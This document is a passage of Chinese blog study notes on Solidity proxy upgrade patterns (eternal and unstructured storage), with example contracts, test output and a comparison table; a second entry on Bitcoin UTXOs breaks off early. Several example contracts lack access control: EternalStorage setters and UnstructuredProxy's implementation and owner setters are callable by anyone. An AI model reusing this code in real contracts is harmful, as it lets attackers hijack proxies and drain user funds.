<p><strong>由于通用的存储模式，逻辑合约与代理合约紧密耦合</strong>。因此，无法将这些逻辑合约与任何其他不继承通用存储合约的代理一起使用。这些问题可以通过其他存储模式有效解决。</p>
<h2 id="永久存储：">永久存储：</h2>
<p>这种方法的目标是<strong>最小化存储复制要求</strong>，如我们上一个示例所示。在这种方法中，<strong>一个单独的合约被维护为一个“永久的”存储合约</strong>。</p>
<p>因此，所有的逻辑合约都使用这个永恒的存储合约来满足他们的存储需求。因此，从<strong>升级模式中删除了存储复制要求</strong>。这种方法显着降低了升级成本。</p>
<h3 id="EternalStorage-sol">EternalStorage.sol:</h3>
<p><code>EternalStorage 合约</code>维护映射作为它的状态变量。它还定义了访问这些映射的方法。</p>
<p><code>EternalStorage 合约</code>是不可变的；因此，最好的方法是在部署此合约之前放置所有<code>映射</code>和<code>访问器</code>。这将允许<code>逻辑合约</code>在这个<code>永久存储合约</code>中存储和检索任何类型的应用程序数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// EternalStorage.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">EternalStorage</span> &#123;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">bytes32</span> =&gt;</span> address) _addressStorage;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">bytes32</span> =&gt;</span> uint256) _uintStorage;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">bytes32</span> =&gt;</span> string) _stringStorage;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getUint</span>(<span class="params">bytes32 key</span>) public view returns (uint256) &#123;</span><br><span class="line">      <span class="keyword">return</span> _uintStorage[key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getAddress</span>(<span class="params">bytes32 key</span>) public view returns (address) &#123;</span><br><span class="line">      <span class="keyword">return</span> _addressStorage[key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getString</span>(<span class="params">bytes32 key</span>) public view returns (string memory) &#123;</span><br><span class="line">      <span class="keyword">return</span> _stringStorage[key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUint</span>(<span class="params">bytes32 key, uint256 value</span>) public &#123;</span><br><span class="line">        _uintStorage[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setAddress</span>(<span class="params">bytes32 key, address value</span>) public &#123;</span><br><span class="line">        _addressStorage[key] = value;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setString</span>(<span class="params">bytes32 key, string memory value</span>) public &#123;</span><br><span class="line">        _stringStorage[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="EternalLogicLibrary-sol">EternalLogicLibrary.sol:</h3>
<p><code>逻辑合约</code>可以使用<code>接口</code>和<code>库</code>进一步划分。在此示例中，使用<code>库合约</code>从<code>逻辑合约</code>中抽象出逻辑。<br />
<strong>库为代码抽象和可重用性提供了很好的案例</strong>。</p>
<p>库类型合约不能有状态变量，不能持有以太币，也不能继承合约。将公共代码部署为库是经济的，因为合约大小会影响 gas 成本。以下库抽象了一些通用代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// EternalLogicLibrary.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;.././EternalStorage.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">library <span class="title class_">EternalLogicLibrary</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getUserAge</span>(<span class="params">address _storageAddress</span>) external view <span class="title function_">returns</span>(<span class="params">uint256</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">EternalStorage</span>(_storageAddress).<span class="title function_">getUint</span>(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getUserName</span>(<span class="params">address _storageAddress</span>) external view <span class="title function_">returns</span>(<span class="params">string memory</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">EternalStorage</span>(_storageAddress).<span class="title function_">getString</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getOwner</span>(<span class="params">address eternalStorage</span>) external view <span class="title function_">returns</span>(<span class="params">address</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">EternalStorage</span>(eternalStorage).<span class="title function_">getAddress</span>(<span class="string">&quot;owner&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUserAge</span>(<span class="params">address _storageAddress, uint256 age</span>) external&#123;</span><br><span class="line">        <span class="title class_">EternalStorage</span>(_storageAddress).<span class="title function_">setUint</span>(<span class="string">&quot;age&quot;</span>, age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUserName</span>(<span class="params">address _storageAddress, string memory name</span>) external &#123;</span><br><span class="line">        <span class="title class_">EternalStorage</span>(_storageAddress).<span class="title function_">setString</span>(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="EternalLogicV1-sol-EternalLogicV2-sol">EternalLogicV1.sol &amp; EternalLogicV2.sol:</h3>
<p>指定库后，是时候实现<code>逻辑合约</code>了。</p>
<p><code>EternalLogicV1 合约</code>为用户的年龄和姓名提供访问器。<code>EternalLogicV2合约</code>升级了<code>EternalLogicV1合约</code>，增加了一个只允许合约拥有者设置属性的修饰符。</p>
<p>两个逻辑合约都使用 <code>EternalLogicLibrary </code>作为地址类型。他们还指定永久存储地址来检索和修改用户的属性。请记住，永久存储在库内使用。</p>
<p>因此，<code>永久存储合约</code>与<code>逻辑库</code>挂钩。这样一来，永久的存储地址就知道了库中实现的所有方法</p>
<p><code>EternalLogicV1.sol</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// EternalLogicV1.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./libraries/EternalLogicLibrary.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">EternalLogicV1</span> &#123;</span><br><span class="line">    using <span class="title class_">EternalLogicLibrary</span> <span class="keyword">for</span> address; </span><br><span class="line">    address public _storage; </span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address __storage</span>)&#123;</span><br><span class="line">        _storage = __storage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getUserAge</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(<span class="params">uint256</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> _storage.<span class="title function_">getUserAge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getUserName</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(<span class="params">string memory</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> _storage.<span class="title function_">getUserName</span>();</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUserAge</span>(<span class="params">uint256 age</span>) external&#123;</span><br><span class="line">         _storage.<span class="title function_">setUserAge</span>(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUserName</span>(<span class="params">string memory name</span>) external &#123;</span><br><span class="line">         _storage.<span class="title function_">setUserName</span>(name);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>EternalLogicV2.sol</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./libraries/EternalLogicLibrary.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">EternalLogicV2</span> &#123;</span><br><span class="line">    using <span class="title class_">EternalLogicLibrary</span> <span class="keyword">for</span> address; </span><br><span class="line">    address public _storage; </span><br><span class="line">    </span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address __storage</span>)&#123;</span><br><span class="line">        _storage = __storage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == _storage.<span class="title function_">getOwner</span>(), <span class="string">&quot;Only Owner&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getUserAge</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(<span class="params">uint256</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> _storage.<span class="title function_">getUserAge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getUserName</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(<span class="params">string memory</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> _storage.<span class="title function_">getUserName</span>();</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUserAge</span>(<span class="params">uint256 age</span>) onlyOwner external&#123;</span><br><span class="line">         _storage.<span class="title function_">setUserAge</span>(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUserName</span>(<span class="params">string memory name</span>) onlyOwner external &#123;</span><br><span class="line">         _storage.<span class="title function_">setUserName</span>(name);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="EternalProxy-sol">EternalProxy.sol:</h3>
<p>最后，编写一个简单的代理来委托对逻辑合约的调用了。代理和永久合约是不可变的。</p>
<p>代理合约还与永久存储合约进行通信，以访问与代理相关的状态变量，如所有者和实现地址。以下是<code>代理合约</code>的示例：</p>
<p><code>EternalProxy.sol</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// EternalProxy.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./EternalStorage.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">EternalProxy</span>&#123;</span><br><span class="line">    <span class="title class_">EternalStorage</span> _storage;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">EternalStorage __storage</span>)&#123;</span><br><span class="line">        _storage = __storage;</span><br><span class="line">        _storage.<span class="title function_">setAddress</span>(<span class="string">&quot;owner&quot;</span>, msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getImplementationAddress</span>(<span class="params"></span>) public view <span class="title function_">returns</span>(<span class="params">address</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>  _storage.<span class="title function_">getAddress</span>(<span class="string">&quot;implementation&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setImplementationAddress</span>(<span class="params">address _implementation</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span>==_storage.<span class="title function_">getAddress</span>(<span class="string">&quot;owner&quot;</span>), <span class="string">&quot;Owner only&quot;</span>);</span><br><span class="line">         _storage.<span class="title function_">setAddress</span>(<span class="string">&quot;implementation&quot;</span>, _implementation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getOwnerAddress</span>(<span class="params"></span>) public view <span class="title function_">returns</span>(<span class="params">address</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> _storage.<span class="title function_">getAddress</span>(<span class="string">&quot;owner&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">fallback</span>() external&#123;</span><br><span class="line">        address implementation = <span class="title function_">getImplementationAddress</span>();</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="attr">ptr</span>:=<span class="title function_">mload</span>(<span class="number">0x40</span>) </span><br><span class="line">            <span class="title function_">calldatacopy</span>(ptr, <span class="number">0</span>, <span class="title function_">calldatasize</span>()) </span><br><span class="line">            <span class="keyword">let</span> response := <span class="title function_">delegatecall</span>(</span><br><span class="line">                <span class="title function_">gas</span>(), </span><br><span class="line">                implementation, </span><br><span class="line">                ptr, </span><br><span class="line">                <span class="title function_">calldatasize</span>(), </span><br><span class="line">                <span class="number">0</span>, </span><br><span class="line">                <span class="number">0</span> </span><br><span class="line">            )</span><br><span class="line">            <span class="title function_">returndatacopy</span>(ptr, <span class="number">0</span>, <span class="title function_">returndatasize</span>()) </span><br><span class="line">            <span class="keyword">switch</span> response </span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> &#123; <span class="title function_">revert</span>(ptr, <span class="title function_">returndatasize</span>()) &#125;</span><br><span class="line">            <span class="keyword">default</span> &#123; <span class="keyword">return</span>(ptr, <span class="title function_">returndatasize</span>()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="测试用例：-2">测试用例：</h3>
<p><a href="https://github.com/jerrychan807/my-awesome-solidity/blob/main/upgradability/test/eternal_storage.test.ts">测试用例</a></p>
<h3 id="测试结果-2">测试结果</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">### 测试结果</span></span><br><span class="line">  Token contract</span><br><span class="line">    <span class="built_in">test</span></span><br><span class="line">Proxy try to upgrade ImplementationAddress To EternalLogicV1.address</span><br><span class="line">[*]test_proxy_pattern_owner_is_correct</span><br><span class="line">[*]test_proxy_pattern_implementation_equals_to_logic_address</span><br><span class="line">[*]test_can_set_and_get_val_from_logicv1</span><br><span class="line">[*]test_can_set_and_get_names_from_logicv1</span><br><span class="line">[*]test_proxy_pattern_implementation_equals_to_new_logic_address</span><br><span class="line">Proxy try to upgrade ImplementationAddress To EternalLogicV2.address</span><br><span class="line">[*]test_can_set_and_get_val_from_logicv2</span><br><span class="line">[*]test_can_set_and_get_names_from_logicv2</span><br><span class="line">      ✔  (2653ms)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">  1 passing (3s)</span><br><span class="line"></span><br><span class="line">✨  Done <span class="keyword">in</span> 7.09s.</span><br></pre></td></tr></table></figure>
<h3 id="缺点：-3">缺点：</h3>
<p>尽管这种模式非常具有成本效益，但这种方法存在一些问题。在编写 EternalStorage 合约时，必须确定所有基本变量类型。</p>
<p>永久存储的访问模式不是很简单。永久存储模式需要一个专用的存储合约，并且不适用于现有合约。</p>
<p>还有另一种流行的方法可以提供无缝升级体验。</p>
<h2 id="非结构化存储">非结构化存储:</h2>
<p>在这种模式下，<code>代理合约</code>往往是具有一些基本功能的简约合约，并且大部分业务逻辑都在<code>逻辑合约</code>内部完成。</p>
<p><strong>新的<code>逻辑合约</code>维护最新实现合约中存在的状态变量的顺序。</strong></p>
<p><code>代理合约</code>通常需要所有者和实现地址来维护所有权和版本控制。<code>代理合约</code>将这些属性指定为常量，并在合约的字节码中设置它们。<code>OpenZepplin</code> 将非结构化存储模式用于其可升级的合约服务。</p>
<p>下面是此模式的简单实现</p>
<h3 id="UnstructuredLogicV1-sol">UnstructuredLogicV1.sol:</h3>
<p><code>UnstructuredLogicV1.sol</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">UnstructuredLogicV1</span> &#123;</span><br><span class="line">    uint256 val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getVal</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(<span class="params">uint256</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setVal</span>(<span class="params">uint256 _newVal</span>) external &#123;</span><br><span class="line">        val = _newVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>UnstructuredLogicV1 合约</code>简单地为一个名为 val 的值提供访问器。</p>
<h3 id="UnstructuredLogicV2-sol">UnstructuredLogicV2.sol:</h3>
<p><code>UnstructuredLogicV2.sol</code></p>
<figure class="highlight js"><figcaption><span>UnstructuredLogicV2.sol</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">UnstructuredLogicV2</span> &#123;</span><br><span class="line">    <span class="comment">// 由于 `UnstructuredProxy` 的第一个存储槽被 `val` 变量占用，</span></span><br><span class="line">    <span class="comment">//`UnstructuredLogicV2` 必须在声明上一个逻辑合约的变量后声明自己的状态变量。</span></span><br><span class="line">    uint256 val;</span><br><span class="line">    uint256 newVal;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getVal</span>(<span class="params"></span>) external view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> newVal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setVal</span>(<span class="params">uint256 _newVal</span>) external &#123;</span><br><span class="line">        newVal = _newVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样，<code>UnstructuredLogicV2 合约</code>通过添加一个名为 <code>newVal</code> 的新变量来升级 <code>UnstructuredLogicV1 合约</code>。</p>
<p>请注意，<code>UnstructuredLogicV2</code> 还包含在 <code>UnstructuredLogicV1 合约</code>中定义的状态变量。</p>
<h3 id="UnstructuredProxy-sol">UnstructuredProxy.sol:</h3>
<p><code>UnstructuredProxy.sol</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">UnstructuredProxy</span> &#123;</span><br><span class="line">    bytes32 private constant ownerPosition = <span class="title function_">bytes32</span>(<span class="title function_">uint256</span>(</span><br><span class="line">    <span class="title function_">keccak256</span>(<span class="string">&#x27;eip1967.proxy.owner&#x27;</span>)) - <span class="number">1</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    bytes32 private constant implementationPosition = <span class="title function_">bytes32</span>(<span class="title function_">uint256</span>(</span><br><span class="line">    <span class="title function_">keccak256</span>(<span class="string">&#x27;eip1967.proxy.implementation&#x27;</span>)) - <span class="number">1</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getImplementationAddress</span>(<span class="params"></span>) public view <span class="title function_">returns</span>(<span class="params">address impl</span>)&#123;</span><br><span class="line">        bytes32 _implementationPosition = implementationPosition;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            impl := <span class="title function_">sload</span>(_implementationPosition)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setImplementationAddress</span>(<span class="params">address _implementationAddress</span>) public &#123;</span><br><span class="line">        bytes32 _implementationPosition = implementationPosition;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="title function_">sstore</span>(_implementationPosition, _implementationAddress)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getOwnerAddress</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(<span class="params">address ownr</span>)&#123;</span><br><span class="line">        bytes32 _ownerPosition = ownerPosition;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            ownr := <span class="title function_">sload</span>(_ownerPosition)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setOwnerAddress</span>(<span class="params">address _ownerAddress</span>) external &#123;</span><br><span class="line">        bytes32 _ownerPosition = ownerPosition;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="title function_">sstore</span>(_ownerPosition, _ownerAddress)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">fallback</span>() external&#123;</span><br><span class="line">        address implementation = <span class="title function_">getImplementationAddress</span>();</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="attr">ptr</span>:=<span class="title function_">mload</span>(<span class="number">0x40</span>)</span><br><span class="line">            <span class="title function_">calldatacopy</span>(ptr, <span class="number">0</span>, <span class="title function_">calldatasize</span>())</span><br><span class="line">            <span class="keyword">let</span> result := <span class="title function_">delegatecall</span>(</span><br><span class="line">                <span class="title function_">gas</span>(),</span><br><span class="line">                implementation,</span><br><span class="line">                ptr,</span><br><span class="line">                <span class="title function_">calldatasize</span>(),</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="number">0</span></span><br><span class="line">            )</span><br><span class="line">            <span class="title function_">returndatacopy</span>(ptr, <span class="number">0</span>, <span class="title function_">returndatasize</span>())</span><br><span class="line">            <span class="keyword">switch</span> result</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> &#123; <span class="title function_">revert</span>(ptr, <span class="title function_">returndatasize</span>()) &#125;</span><br><span class="line">            <span class="keyword">default</span> &#123; <span class="keyword">return</span>(ptr, <span class="title function_">returndatasize</span>()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即使解决了<code>代理合约</code>和<code>逻辑合约</code>之间的存储冲突问题，不同逻辑合约的状态变量之间仍然可能发生冲突。</p>
<p>这是因为在第一个逻辑合约中声明的变量占用了代理内部可用的第一个存储槽。<strong>请记住，程序将实现和所有权变量的值存储在相当随机的位置</strong>。由于 <code>UnstructuredProxy</code> 的第一个存储槽被 <code>val</code> 变量占用，<code>UnstructuredLogicV2</code> 必须在声明上一个逻辑合约的变量后声明自己的状态变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">┌─────────────────────┬───────────────────┬──────────────┬────────┬───────────────────────────────────────┐</span><br><span class="line">│ contract            │ state_variable    │ storage_slot │ offset │ type                                  │</span><br><span class="line">├─────────────────────┼───────────────────┼──────────────┼────────┼───────────────────────────────────────┤</span><br><span class="line">│ UnstructuredLogicV1 │ val               │      0       │   0    │ t_uint256                             │</span><br><span class="line">│ UnstructuredLogicV2 │ val               │      0       │   0    │ t_uint256                             │</span><br><span class="line">│ UnstructuredLogicV2 │ newVal            │      1       │   0    │ t_uint256                             │</span><br><span class="line">└─────────────────────┴───────────────────┴──────────────┴────────┴───────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
<p><strong>这种方法在代理存储内部保持严格的存储顺序，并有助于避免意外覆盖存储变量</strong></p>
<h3 id="测试用例：-3">测试用例：</h3>
<p><a href="https://github.com/jerrychan807/my-awesome-solidity/blob/main/upgradability/test/unstructured_pattern.test.ts">测试用例</a></p>
<h3 id="测试结果-3">测试结果:</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  Token contract</span><br><span class="line">    <span class="built_in">test</span></span><br><span class="line">Proxy try to upgrade ImplementationAddress To UnstructuredLogicV1.address</span><br><span class="line">[*]test_proxy_pattern_implementation_equals_to_logic_address</span><br><span class="line">Proxy setImplementationAddress successfully</span><br><span class="line">[*]test_can_set_and_get_val_from_logicv1</span><br><span class="line">[*]test_proxy_pattern_implementation_equals_to_new_logic_address</span><br><span class="line">Proxy try to upgrade ImplementationAddress To UnstructuredLogicV2.address</span><br><span class="line">[*]test_can_set_and_get_names_from_logicv2</span><br><span class="line">      ✔  (1719ms)</span><br><span class="line"></span><br><span class="line">  1 passing (2s)</span><br><span class="line"></span><br><span class="line">✨  Done <span class="keyword">in</span> 5.73s.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>Summary:</h1>
<p>继承存储：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220629145421.png" alt="20220629145421" /></p>
<p>永久存储：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220629155154.png" alt="20220629155154" /></p>
<p>非结构化存储:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220629155214.png" alt="20220629155214" /></p>
<table>
<thead>
<tr>
<th>存储模式</th>
<th>改进点</th>
<th>特点</th>
<th>目的</th>
<th>缺点1</th>
<th>缺点2</th>
<th>缺点3</th>
</tr>
</thead>
<tbody>
<tr>
<td>继承存储</td>
<td>逻辑和代理合约之间保持相同的存储顺序，从而避免状态冲突</td>
<td>逻辑合约中仍有部分状态变量</td>
<td>解决存储冲突问题</td>
<td>升级时，需要同步之前的状态变量,耗费gas</td>
<td>一些未使用的变量占用了内存</td>
<td>逻辑合约与代理合约紧密耦合,无法将这些逻辑合约与任何其他不继承通用存储合约的代理一起使用</td>
</tr>
<tr>
<td>永久存储</td>
<td>逻辑合约不存状态变量，状态变量都存在一个单独的“永久的”存储合约</td>
<td>所有的逻辑合约都使用这个永久存储合约来进行存储</td>
<td>最小化存储复制要求</td>
<td>在编写永久存储合约时，必须确定所有基本变量类型</td>
<td>永久存储的访问模式不是很简单</td>
<td>永久存储模式需要一个专用的存储合约，并且不适用于现有合约。</td>
</tr>
<tr>
<td>非结构化存储</td>
<td>不需要一个专用的存储合约</td>
<td>新的逻辑合约继续维护旧逻辑合约中存在的状态变量的顺序，<code>代理合约</code>通常需要所有者和实现地址来维护所有权和版本控制，<code>代理合约</code>将这些属性指定为常量，并在合约的字节码中设置它们。</td>
<td>——</td>
<td>——</td>
<td>——</td>
<td>——</td>
</tr>
</tbody>
</table>
<p>具有继承、永久或非结构化存储的基于代理的可升级模式为智能合约提供了一个不错的可升级架构。</p>
<p>还有一些高级可升级模式。这些模式可以更好地控制可升级性，同时解决 Solidity 语言施加的一些基本限制。让我们在本系列的下一部分详细了解一些高级可升级模式</p>
<blockquote>
<p>还不是完全理解，后续再反复看看</p>
</blockquote>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://medium.com/@shub.sharma350/upgradability-patterns-in-solidity-part-2-8a2e531d80f8">Upgradability patterns in Solidity — Part 2</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-What_is_Unspent_Transaction_Output_UTXO</title>
    <url>/2022/54888.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://www.geeksforgeeks.org/what-is-unspent-transaction-output-utxo/">What is Unspent Transaction Output (UTXO)?</a>，学习记录。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>区块链是一种数字化、去中心化的分布式账本。</p>
</li>
<li class="lvl-2">
<p>区块链利用 P2P（点对点）网络，网络上的参与者被称为节点。</p>
</li>
<li class="lvl-2">
<p>账本中存储有关交易的数据。</p>
</li>
<li class="lvl-2">
<p>它是一个由区块组成的链，其中最显着的特征是<strong>区块以密码学的方式链接在一起</strong>。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220809164409.png" alt="20220809164409" /></p>
<h1>以密码学的方式链接在一起:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>除了第一个块（称为创世块）之外，区块链中的每个块都包含一个称为前一个哈希的字段。它是链中前一个块的哈希。这使得区块链非常安全。</p>
</li>
<li class="lvl-2">
<p>如果攻击者试图改变一个区块的数据，该区块的哈希值将会改变，如前所述，下一个区块将持有当前区块的哈希值，如果哈希值改变，则链将被破坏。或者，攻击者必须从那时起再次挖掘所有块。这是 51% 攻击的可能性。</p>
</li>
</ul>
<h1>什么是块？</h1>
<p>区块链中的块存储着交易信息。<br />
例如比特币，区块每 10 分钟添加到区块链中，根据目标哈希的复杂性，这可能会随着挖掘新块的时间而变化。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>当矿工成功开采区块时，它会被添加到区块链中。</p>
</li>
<li class="lvl-2">
